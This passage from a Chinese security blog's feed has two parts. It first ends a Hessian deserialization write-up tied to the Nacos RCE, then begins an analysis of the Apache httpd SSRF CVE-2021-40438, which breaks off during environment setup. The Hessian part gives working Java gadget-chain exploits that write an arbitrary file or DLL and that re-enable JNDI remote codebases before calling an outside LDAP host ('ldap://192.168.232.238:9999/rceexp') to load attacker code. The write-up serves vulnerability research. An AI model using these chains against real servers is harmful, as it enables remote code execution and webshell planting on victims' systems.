class="hljs-symbol">get:</span><span class="hljs-number">161</span>, UIDefaults (javax.swing)<br><span class="hljs-symbol">getAttribute:</span><span class="hljs-number">265</span>, PKCS9Attributes (sun.security.pkcs)<br><span class="hljs-symbol">toString:</span><span class="hljs-number">334</span>, PKCS9Attributes (sun.security.pkcs)<br><span class="hljs-symbol">valueOf:</span><span class="hljs-number">2994</span>, String (java.lang)<br><span class="hljs-symbol">append:</span><span class="hljs-number">131</span>, StringBuilder (java.lang)<br><span class="hljs-symbol">expect:</span><span class="hljs-number">2865</span>, Hessian2Input (<span class="hljs-keyword">com</span>.caucho.hessian.io)<br><span class="hljs-symbol">readString:</span><span class="hljs-number">1407</span>, Hessian2Input (<span class="hljs-keyword">com</span>.caucho.hessian.io)<br><span class="hljs-symbol">readObjectDefinition:</span><span class="hljs-number">2163</span>, Hessian2Input (<span class="hljs-keyword">com</span>.caucho.hessian.io)<br><span class="hljs-symbol">readObject:</span><span class="hljs-number">2105</span>, Hessian2Input (<span class="hljs-keyword">com</span>.caucho.hessian.io)<br></code></pre></td></tr></table></figure><h5 id="3-3-3-com-sun-org-apache-xml-internal-security-utils-JavaUtils"><a href="#3-3-3-com-sun-org-apache-xml-internal-security-utils-JavaUtils" class="headerlink" title="3.3.3 com.sun.org.apache.xml.internal.security.utils.JavaUtils"></a>3.3.3 com.sun.org.apache.xml.internal.security.utils.JavaUtils</h5><p>这个没什么好说得，直接写文件，在web环境下直接写webshell就行。当然也可以先写入动态链接库，再调用 System#load 加载进行命令执行</p><p><img src="/img/from-Ali-Nacos-RCE-to-RPC-Hessian-protocol-security/39.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.security.utils.JavaUtils;<br><span class="hljs-keyword">import</span> org.utils.MakeUtils;<br><span class="hljs-keyword">import</span> org.utils.Payload;<br><span class="hljs-keyword">import</span> sun.swing.SwingLazyValue;<br><span class="hljs-keyword">import</span> javax.swing.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.nio.charset.StandardCharsets;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Hashtable;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JavaUtilsWriteFile</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Payload.run(getUtilsWriteFileObject());<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> HashMap&lt;Object, Object&gt; <span class="hljs-title function_">getUtilsWriteFileObject</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">        com.sun.org.apache.xml.internal.security.utils.JavaUtils.writeBytesToFilename</span><br><span class="hljs-comment">         */</span><br><br>        <span class="hljs-type">byte</span>[] bytes = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;E:\\calc.dll&quot;</span>));<br>        <span class="hljs-type">String</span> <span class="hljs-variable">fileName</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;E:\\calc-result.dll&quot;</span>;<br>        <span class="hljs-type">SwingLazyValue</span> <span class="hljs-variable">swingLazyValue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SwingLazyValue</span>(<br>                <span class="hljs-string">&quot;com.sun.org.apache.xml.internal.security.utils.JavaUtils&quot;</span>,<br>                <span class="hljs-string">&quot;writeBytesToFilename&quot;</span>,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;fileName,bytes&#125;);<br>        Object[] keyValueList = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;abc&quot;</span>,swingLazyValue&#125;;<br>        <span class="hljs-type">UIDefaults</span> <span class="hljs-variable">uiDefaults1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UIDefaults</span>(keyValueList);<br>        <span class="hljs-type">UIDefaults</span> <span class="hljs-variable">uiDefaults2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UIDefaults</span>(keyValueList);<br><br>        Hashtable&lt;Object, Object&gt; hashtable1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hashtable</span>&lt;&gt;();<br>        Hashtable&lt;Object, Object&gt; hashtable2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hashtable</span>&lt;&gt;();<br>        hashtable1.put(<span class="hljs-string">&quot;a&quot;</span>,uiDefaults1);<br>        hashtable2.put(<span class="hljs-string">&quot;a&quot;</span>,uiDefaults2);<br>        <span class="hljs-keyword">return</span> MakeUtils.makeMap(hashtable1,hashtable2);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>调用栈：</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">writeBytesToFilename:</span><span class="hljs-number">85</span>, JavaUtils (<span class="hljs-keyword">com</span>.sun<span class="hljs-meta">.org</span>.apache.xml.internal.security.utils)<br>invoke调用<br><span class="hljs-symbol">createValue:</span><span class="hljs-number">73</span>, SwingLazyValue (sun.swing)<br><span class="hljs-symbol">getFromHashtable:</span><span class="hljs-number">216</span>, UIDefaults (javax.swing)<br><span class="hljs-symbol">get:</span><span class="hljs-number">161</span>, UIDefaults (javax.swing)<br><span class="hljs-symbol">equals:</span><span class="hljs-number">815</span>, Hashtable (java.util)<br><span class="hljs-symbol">equals:</span><span class="hljs-number">815</span>, Hashtable (java.util)<br><span class="hljs-symbol">putVal:</span><span class="hljs-number">636</span>, HashMap (java.util)<br><span class="hljs-symbol">put:</span><span class="hljs-number">613</span>, HashMap (java.util)<br><span class="hljs-symbol">readMap:</span><span class="hljs-number">114</span>, MapDeserializer (<span class="hljs-keyword">com</span>.caucho.hessian.io)<br><span class="hljs-symbol">readMap:</span><span class="hljs-number">577</span>, SerializerFactory (<span class="hljs-keyword">com</span>.caucho.hessian.io)<br><span class="hljs-symbol">readObject:</span><span class="hljs-number">1160</span>, HessianInput (<span class="hljs-keyword">com</span>.caucho.hessian.io)<br></code></pre></td></tr></table></figure><h5 id="3-3-4-System-setProperty-JNDI"><a href="#3-3-4-System-setProperty-JNDI" class="headerlink" title="3.3.4 System.setProperty + JNDI"></a>3.3.4 System.setProperty + JNDI</h5><p>jdk中设置环境变量得方法java.lang.System#setProperty是静态方法，符合SwingLazyValue#createValue调用的条件。所以我们可以通过调用setProperty复活高版本下的JNDI注入，JNDI注入可参考： <a href="https://pwnull.github.io/2022/jndi-injection-history/">https://pwnull.github.io/2022/jndi-injection-history/</a></p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">import org.utils.MakeUtils;<br>import org.utils.Payload;<br>import sun.swing.SwingLazyValue;<br>import javax.swing.*;<br>import java.util.HashMap;<br>import java.util.Hashtable;<br><br>public <span class="hljs-keyword">class</span> SetPropertyJndi &#123;<br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">    System.setProperty + InitalContext.doLookup</span><br><span class="hljs-comment">     */</span><br>    public static void main(String<span class="hljs-literal">[]</span> args) throws Exception &#123;<br>        String className = <span class="hljs-string">&quot;java.lang.System&quot;</span>;<br>        String methodName = <span class="hljs-string">&quot;setProperty&quot;</span>;<br>        String<span class="hljs-literal">[]</span> args1 = &#123;<span class="hljs-string">&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;</span>, <span class="hljs-string">&quot;true&quot;</span>&#125;;<br>        String<span class="hljs-literal">[]</span> args2 = &#123;<span class="hljs-string">&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;</span>, <span class="hljs-string">&quot;true&quot;</span>&#125;;<br>        String<span class="hljs-literal">[]</span> args3 = &#123;<span class="hljs-string">&quot;java.rmi.server.useCodebaseOnly&quot;</span>, <span class="hljs-string">&quot;false&quot;</span>&#125;;<br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Payload</span>.</span></span>run(get<span class="hljs-constructor">SetPropertyJndiObject(<span class="hljs-params">className</span>,<span class="hljs-params">methodName</span>,<span class="hljs-params">args1</span>)</span>);<br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Payload</span>.</span></span>run(get<span class="hljs-constructor">SetPropertyJndiObject(<span class="hljs-params">className</span>,<span class="hljs-params">methodName</span>,<span class="hljs-params">args2</span>)</span>);<br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Payload</span>.</span></span>run(get<span class="hljs-constructor">SetPropertyJndiObject(<span class="hljs-params">className</span>,<span class="hljs-params">methodName</span>,<span class="hljs-params">args3</span>)</span>);<br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Payload</span>.</span></span>run(get<span class="hljs-constructor">SetPropertyJndiObject(<span class="hljs-string">&quot;javax.naming.InitialContext&quot;</span>,<span class="hljs-string">&quot;doLookup&quot;</span>,<span class="hljs-params">new</span> Object[]&#123;<span class="hljs-string">&quot;ldap://192.168.232.238:9999/rceexp&quot;</span>&#125;)</span>);<br>    &#125;<br>    public static HashMap&lt;Object, Object&gt; get<span class="hljs-constructor">SetPropertyJndiObject(String <span class="hljs-params">className</span>,String <span class="hljs-params">methodName</span>,Object[] <span class="hljs-params">args</span>)</span> throws Exception &#123;<br>        SwingLazyValue swingLazyValue = <span class="hljs-keyword">new</span> <span class="hljs-constructor">SwingLazyValue(<span class="hljs-params">className</span>, <span class="hljs-params">methodName</span>, <span class="hljs-params">args</span>)</span>;<br>        Object<span class="hljs-literal">[]</span> keyValueList = <span class="hljs-keyword">new</span> Object<span class="hljs-literal">[]</span>&#123;<span class="hljs-string">&quot;abc&quot;</span>,swingLazyValue&#125;;<br>        UIDefaults uiDefaults1 = <span class="hljs-keyword">new</span> <span class="hljs-constructor">UIDefaults(<span class="hljs-params">keyValueList</span>)</span>;<br>        UIDefaults uiDefaults2 = <span class="hljs-keyword">new</span> <span class="hljs-constructor">UIDefaults(<span class="hljs-params">keyValueList</span>)</span>;<br><br>        Hashtable&lt;Object, Object&gt; hashtable1 = <span class="hljs-keyword">new</span> Hashtable&lt;&gt;<span class="hljs-literal">()</span>;<br>        Hashtable&lt;Object, Object&gt; hashtable2 = <span class="hljs-keyword">new</span> Hashtable&lt;&gt;<span class="hljs-literal">()</span>;<br>        hashtable1.put(<span class="hljs-string">&quot;a&quot;</span>,uiDefaults1);<br>        hashtable2.put(<span class="hljs-string">&quot;a&quot;</span>,uiDefaults2);<br>        return <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">MakeUtils</span>.</span></span>make<span class="hljs-constructor">Map(<span class="hljs-params">hashtable1</span>,<span class="hljs-params">hashtable2</span>)</span>;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="/img/from-Ali-Nacos-RCE-to-RPC-Hessian-protocol-security/40.png"></p><p>调试看到高版本JDK下的trustURLCodebase、useCodebaseOnly变量已成功修改</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">String env=<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>get<span class="hljs-constructor">Property(<span class="hljs-string">&quot;java.runtime.version&quot;</span>)</span>.<span class="hljs-keyword">to</span><span class="hljs-constructor">String()</span>.<span class="hljs-keyword">to</span><span class="hljs-constructor">String()</span>+<span class="hljs-string">&quot;$&quot;</span>+<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>get<span class="hljs-constructor">Property(<span class="hljs-string">&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;</span>)</span>.<span class="hljs-keyword">to</span><span class="hljs-constructor">String()</span>+<span class="hljs-string">&quot;$&quot;</span>+<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>get<span class="hljs-constructor">Property(<span class="hljs-string">&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;</span>)</span>.<span class="hljs-keyword">to</span><span class="hljs-constructor">String()</span>+<span class="hljs-string">&quot;$&quot;</span>+<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>get<span class="hljs-constructor">Property(<span class="hljs-string">&quot;java.rmi.server.useCodebaseOnly&quot;</span>)</span>.<span class="hljs-keyword">to</span><span class="hljs-constructor">String()</span>;<br>env<br></code></pre></td></tr></table></figure><p><img src="/img/from-Ali-Nacos-RCE-to-RPC-Hessian-protocol-security/41.png"></p><p>另外还有几个方法，效果与上面分析的类似，就不一一列举分析</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus">DumpBytecode<span class="hljs-selector-class">.dumpBytecode</span> + System<span class="hljs-selector-class">.load</span>   写入文件+System.load调用<br>com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.org</span><span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.xalan</span><span class="hljs-selector-class">.internal</span><span class="hljs-selector-class">.xslt</span><span class="hljs-selector-class">.Process</span>._main <br>sun<span class="hljs-selector-class">.tools</span><span class="hljs-selector-class">.jar</span><span class="hljs-selector-class">.Main</span><span class="hljs-selector-class">.main</span><br>System<span class="hljs-selector-class">.setProperty</span> + jdk<span class="hljs-selector-class">.jfr</span><span class="hljs-selector-class">.internal</span><span class="hljs-selector-class">.Utils</span><span class="hljs-selector-class">.writeGeneratedAsm</span>  openjdk<br></code></pre></td></tr></table></figure><p>另外在分析Hessian链中，需要注意的问题是IDEA在调试时会自动调用toString方法打印字符串，而分析的链正是基于toString，提前调用会引发错误，解决方案是在设置中取消勾选红框选项</p><p><img src="/img/from-Ali-Nacos-RCE-to-RPC-Hessian-protocol-security/42.png"></p><h2 id="4、总结"><a href="#4、总结" class="headerlink" title="4、总结"></a>4、总结</h2><p>纵观近两年出现风险较大的漏洞，常见的能够一发入魂、直接通往RCE的WEB漏洞肉眼可见的变少，随之替代的是各种协议问题、远程RPC方法调用、三方依赖包污染、框架底层函数问题等利用手法。安全技术5年一更新，近几年被HW带火的JAVA安全领域，国内的师傅几乎把能卷的产品&#x2F;组件&#x2F;框架都卷了个遍，像Weblogic&#x2F;Struts2&#x2F;Spring&#x2F;Log4J&#x2F;Apache&#x2F;Xstream等大型框架&#x2F;组件的漏洞破解，JDBC&#x2F;内存马&#x2F;利用回显&#x2F;shell免杀等技术遍地开花。这让每个想入门JAVA安全的新手都能搜见如山的资料，只要愿意投入时间，多上手调代码，就能掌握好这些技术。</p><p>那么什么是安全技术的核心？什么样的安全技术，能持续3-5年甚至10年？这些安全技术能给企业带来什么保障？</p><p>归纳总结、触类旁通，大胆假设，小心求证~</p><h2 id="5、参考"><a href="#5、参考" class="headerlink" title="5、参考"></a>5、参考</h2><p><a href="https://nacos.io/zh-cn/docs/v2/upgrading/2.0.0-compatibility.html">https://nacos.io/zh-cn/docs/v2/upgrading/2.0.0-compatibility.html</a></p><p><a href="https://github.com/waderwu/My-CTF-Challenges/tree/master/0ctf-2022/hessian-onlyJdk/writeup">https://github.com/waderwu/My-CTF-Challenges/tree/master/0ctf-2022/hessian-onlyJdk/writeup</a></p><p><a href="https://l1nyz-tel.cc/2023/1/10/0ctf2022-hessian-onlyjdk/">https://l1nyz-tel.cc/2023/1/10/0ctf2022-hessian-onlyjdk/</a></p><p><a href="http://miku233.viewofthai.link/2022/10/13/0ctf-hessian-onlyjdk/">http://miku233.viewofthai.link/2022/10/13/0ctf-hessian-onlyjdk/</a></p><p><a href="https://guokeya.github.io/post/psaIZKtC4/">https://guokeya.github.io/post/psaIZKtC4/</a></p>]]></content>
    
    
    <categories>
      
      <category>漏洞追踪</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞分析</tag>
      
      <tag>Nacos</tag>
      
      <tag>RPC</tag>
      
      <tag>Hessian</tag>
      
      <tag>反序列化</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>从HTTPD-SSRF CVE-2021-40438起手的RCE漏洞挖掘</title>
    <link href="/2023/From-apache-httpd-ssrf-cve-2021-40438-to-Rce/"/>
    <url>/2023/From-apache-httpd-ssrf-cve-2021-40438-to-Rce/</url>
    
    <content type="html"><![CDATA[<p>Apache官方在 2021-09-16更新发布Apache Httpd 2.4.49版本，在这个版本中修复了CVE-2021-40438、CVE-2021-33193、CVE-2021-34798、CVE-2021-36160、 CVE-2021-39275等5个漏洞。其中CVE-2021-40438 为mod_proxy模块下的SSRF漏洞，影响版本为2.4.48及以下。根据官方描述来看此漏洞是Apache内部安全团队在分析CVE-2021-36160   mod_proxy_uwsg  DoS 时无意发现的，由于mod_proxy模块为Apache HTTP Server实现了基础代理&#x2F;网关功能，支持很多常见协议如http、ajp、fastcgi、ftp等，所以该模块在很多通用系统中都会使用到，漏洞的影响范围是相当广的。</p><p>另外笔者在后续对多个使用mod_proxy模块的大型应用系统分析时，大部分都存在此安全问题，且如果可以找到存在敏感功能的后端Unix Domain Socket&#x2F;本地服务，那么就可以利用代理漏洞请求后端敏感服务 组合串联最终达成RCE的效果。本文只做思路分享、技术交流，不提供任何形式的EXP！</p><p>文章前半部分为Apache Httpd的调试环境搭建与漏洞分析，后半部分是对该漏洞在实际挖掘场景中的一些思考与总结。 如果对文章有疑问&#x2F;建议或者想一起研究交流的师傅，欢迎私信😜 </p><p> <strong>PS：本文仅用于技术讨论。严禁用于任何非法用途，违者后果自负。</strong> </p><h2 id="1、安装部署"><a href="#1、安装部署" class="headerlink" title="1、安装部署"></a>1、安装部署</h2><p>本次演示部署了2.4.43版本的Apache Httpd，并且使用vscode远程调试linux下的Apache Httpd服务。这部分内容参考了P师傅星球的文章：<a href="https://t.zsxq.com/RvfmEu3">https://t.zsxq.com/RvfmEu3</a> 、<a href="https://t.zsxq.com/7qNfeie">https://t.zsxq.com/7qNfeie</a>   致敬感谢分享！ </p><h3 id="1-1-linux部署环境"><a href="#1-1-linux部署环境" class="headerlink" title="1.1 linux部署环境"></a>1.1 linux部署环境</h3><p>下载2.4.43版本的源码自行编译，另外此次漏洞涉及到了apr、apr-util的函数，所以apache在指定编译时需要指定apr和aprutil</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">apt</span>-get install build-essential gdb <br><span class="hljs-attribute">apt</span>-get install --no-install-recommends libapr1-dev libaprutil1-dev libpcre3-dev<br><br><span class="hljs-attribute">https</span>://archive.apache.org/dist/httpd/  <span class="hljs-number">2</span>.<span class="hljs-number">4</span>.<span class="hljs-number">43</span><br><span class="hljs-attribute">https</span>://downloads.apache.org/apr/   下载apr-<span class="hljs-number">1</span>.<span class="hljs-number">6</span>.<span class="hljs-number">5</span>.tar.gz  apr-util-<span class="hljs-number">1</span>.<span class="hljs-number">6</span>.<span class="hljs-number">1</span>.tar.gz<br><br><span class="hljs-attribute">tar</span> -zxvf apr-<span class="hljs-number">1</span>.<span class="hljs-number">6</span>.<span class="hljs-number">5</span>.tar.gz<br><span class="hljs-attribute">tar</span> -zxvf apr-util-<span class="hljs-number">1</span>.<span class="hljs-number">6</span>.<span class="hljs-number">1</span>.tar.gz<br></code></pre></td></tr></table></figure><p>编译</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/root/m</span>ake-tools/apr-<span class="hljs-number">1.6</span>.<span class="hljs-number">5</span>&gt;<br>CFLAGS=<span class="hljs-string">&quot;-g&quot;</span> .<span class="hljs-regexp">/configure --prefix=/</span>root<span class="hljs-regexp">/apache-ext/</span>apr<br>make &amp;&amp; make install<br><br><span class="hljs-regexp">/root/m</span>ake-tools/apr-util-<span class="hljs-number">1.6</span>.<span class="hljs-number">1</span>&gt;<br>CFLAGS=<span class="hljs-string">&quot;-g&quot;</span> .<span class="hljs-regexp">/configure --prefix=/</span>root<span class="hljs-regexp">/apache-ext/</span>apr-util --with-apr=<span class="hljs-regexp">/root/</span>apache-ext/apr<br>make &amp;&amp; make install<br><br><br>编译httpd：<br><span class="hljs-regexp">/root/</span>apache/httpd-<span class="hljs-number">2.4</span>.<span class="hljs-number">43</span>&gt;<br>CFLAGS=<span class="hljs-string">&quot;-g&quot;</span> .<span class="hljs-regexp">/configure --prefix=/</span>root<span class="hljs-regexp">/apache/</span>httpd-bin --with-apr=<span class="hljs-regexp">/root/</span>apache-ext<span class="hljs-regexp">/apr --with-apr-util=/</span>root<span class="hljs-regexp">/apache-ext/</span>apr-util<br>make &amp;&amp; make install<br></code></pre></td></tr></table></figure><p><img src="/img/from-apache-httpd-ssrf-cve-2021-40438-to-rce/1.png"></p><p><img src="/img/from-apache-httpd-ssrf-cve-2021-40438-to-rce/2.png"></p><p><img src="/img/from-apache-httpd-ssrf-cve-2021-40438-to-rce/3.png"></p><p>编译完成后开始配置<code>httpd-bin/conf/httpd.conf</code>，将proxy_module.so和mod_proxy_http.so注释去掉，且在文件末尾增加如下配置</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-params">&lt;VirtualHost *&gt;</span><br>   ServerAdmin webmaster@localhost<br>   ServerName <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><br>   DocumentRoot <span class="hljs-keyword">/root/</span>apache<span class="hljs-keyword">/httpd-plus/</span>htdocs<br>   LogLevel notice proxy:trace8<br>   ErrorLog <span class="hljs-keyword">/root/</span>apache<span class="hljs-keyword">/httpd-plus/</span>logs/error.log<br>   CustomLog <span class="hljs-keyword">/root/</span>apache<span class="hljs-keyword">/httpd-plus/</span>logs/access.log combined<br>   ProxyPass /link <span class="hljs-string">&quot;http://127.0.0.1:8000/&quot;</span><br>   ProxyPassReverse /link <span class="hljs-string">&quot;http://127.0.0.1:8000/&quot;</span><br><span class="hljs-params">&lt;/VirtualHost&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/img/from-apache-httpd-ssrf-cve-2021-40438-to-rce/4.png"></p><h3 id="1-2-远程调试Httpd"><a href="#1-2-远程调试Httpd" class="headerlink" title="1.2 远程调试Httpd"></a>1.2 远程调试Httpd</h3><p>vscode插件下载地址：<br><a href="https://marketplace.visualstudio.com/search?term=remote&amp;target=VSCode">https://marketplace.visualstudio.com/search?term=remote&amp;target=VSCode</a></p><p><img src="/img/from-apache-httpd-ssrf-cve-2021-40438-to-rce/5.png"></p><p>然后安装一下调试C时所需要的VSCode扩展：</p><p><a href="https://marketplace.visualstudio.com/items?itemName=ms-vscode.cpptools">https://marketplace.visualstudio.com/items?itemName=ms-vscode.cpptools</a> </p><p>离线安装remote-ssh插件</p><p><a href="https://www.cnblogs.com/litaozijin/p/13202992.html">https://www.cnblogs.com/litaozijin/p/13202992.html</a></p><p>在vscode调试界面创建配置文件 launch.json</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs prolog">&#123;<br>    <span class="hljs-string">&quot;version&quot;</span>: <span class="hljs-string">&quot;0.2.0&quot;</span>,<br>    <span class="hljs-string">&quot;configurations&quot;</span>: [<br><br>        &#123;   <br>            <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;httpd-bin-gdb-debug&quot;</span>,<br>            <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;cppdbg&quot;</span>,<br>            <span class="hljs-string">&quot;request&quot;</span>: <span class="hljs-string">&quot;launch&quot;</span>,<br>            <span class="hljs-string">&quot;program&quot;</span>: <span class="hljs-string">&quot;/root/apache/httpd-bin/bin/httpd&quot;</span>,<br>            <span class="hljs-string">&quot;args&quot;</span>: [<span class="hljs-string">&quot;-X&quot;</span>, <span class="hljs-string">&quot;-DFOREGROUND&quot;</span>],<br>            <span class="hljs-string">&quot;stopAtEntry&quot;</span>: false,<br>            <span class="hljs-string">&quot;cwd&quot;</span>: <span class="hljs-string">&quot;/root/apache/httpd-bin&quot;</span>,<br>            <span class="hljs-string">&quot;environment&quot;</span>: [],<br>            <span class="hljs-string">&quot;externalConsole&quot;</span>: false,<br>            <span class="hljs-string">&quot;MIMode&quot;</span>: <span class="hljs-string">&quot;gdb&quot;</span>,<br>            <span class="hljs-string">&quot;setupCommands&quot;</span>: [<br>                &#123;<br>                    <span class="hljs-string">&quot;description&quot;</span>: <span class="hljs-string">&quot;Enable pretty-printing for gdb&quot;</span>,<br>                    <span class="hljs-string">&quot;text&quot;</span>: <span class="hljs-string">&quot;-enable-pretty-printing&quot;</span>,<br>                    <span class="hljs-string">&quot;ignoreFailures&quot;</span>: true<br>                &#125;<br>            ]<br>        &#125;<br>    ]<br>&#125;<br></code></pre></td></tr></table></figure><p>关闭远程服务器的httpd服务，使用本地vscode的gdb重新启动即可</p><p><img src="/img/from-apache-httpd-ssrf-cve-2021-40438-to-rce/6.png"></p><p>断点下在proxy_util.c#fix_uds_filename()，访问地址 <a href="http://192.168.232.134/link">http://192.168.232.134/link</a>  成功断到</p><p><img src="/img/from-apache-httpd-ssrf-cve-2021-40438-to-rce/7.png"></p><h2 id="2、漏洞分析"><a href="#2、漏洞分析" class="headerlink" title="2、漏洞分析"></a>2、漏洞分析</h2><h3 id="2-1-安全公告"><a href="#2-1-安全公告" class="headerlink" title="2.1 安全公告"></a>2.1 安全公告</h3><p>CVE-2021-40438 为mod_proxy模块的SSRF漏洞，官方安全公告影响版本为2.4.48及以下</p><p><a href="https://httpd.apache.org/security/vulnerabilities_24.html">https://httpd.apache.org/security/vulnerabilities_24.html</a></p><p><img src="/img/from-apache-httpd-ssrf-cve-2021-40438-to-rce/8.png"></p><h3 id="2-2-补丁对比"><a href="#2-2-补丁对比" class="headerlink" title="2.2 补丁对比"></a>2.2 补丁对比</h3><p>CVE-2021-40438 修复的committed:  <a href="https://github.com/apache/httpd/commit/520dcd80a45ce237e9a46ee28697e1b8af3fcd7e?diff=split">https://github.com/apache/httpd/commit/520dcd80a45ce237e9a46ee28697e1b8af3fcd7e?diff=split</a></p><p><img 